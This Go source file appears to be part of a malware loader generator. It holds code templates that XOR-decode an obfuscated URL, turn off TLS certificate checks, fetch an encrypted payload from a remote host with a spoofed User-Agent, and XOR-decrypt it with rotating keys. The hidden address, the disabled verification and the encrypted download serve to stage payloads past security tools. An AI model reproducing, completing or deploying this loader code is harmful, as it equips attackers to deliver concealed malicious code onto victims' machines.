package encode

var (
	YuanChengDecodeString = []string{`
	"crypto/tls"
	yuanchengIO "io"
	"net/http"
	yuanchengHex "encoding/hex"
`, `

// unxorURL 对异或加密的URL进行解密
func UnxorURLOrFileName(hexStr string, key byte) (string, error) {
	encrypted, err := yuanchengHex.DecodeString(hexStr)
	if err != nil {
		return "", err
	}

	result := make([]byte, len(encrypted))
	for i := 0; i < len(encrypted); i++ {
		result[i] = encrypted[i] ^ key
	}
	return string(result), nil
}

`, `
	encFileName := //__DATA_UrlOrFileEncrypted__
	deFileName, _ := UnxorURLOrFileName(string(encFileName), byte(//__URL_XOR_KEY__))

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}
	req, _ := http.NewRequest("GET", deFileName, nil)
	req.Header.Set("User-Agent", "//__USER_AGENT__")

	resp, _ := client.Do(req)
	defer resp.Body.Close()
	EncByteArray, _ := yuanchengIO.ReadAll(resp.Body)
	XorKeyData := //__DATA_XorKey__
	key1 := XorKeyData[0]
	key2 := XorKeyData[1]
	key3 := XorKeyData[2]
	key4 := XorKeyData[3]
	rotateN := uint(XorKeyData[4])
	byteArray := XorDecrypt(EncByteArray, key1, key2, key3, key4, rotateN)`,
	}
)
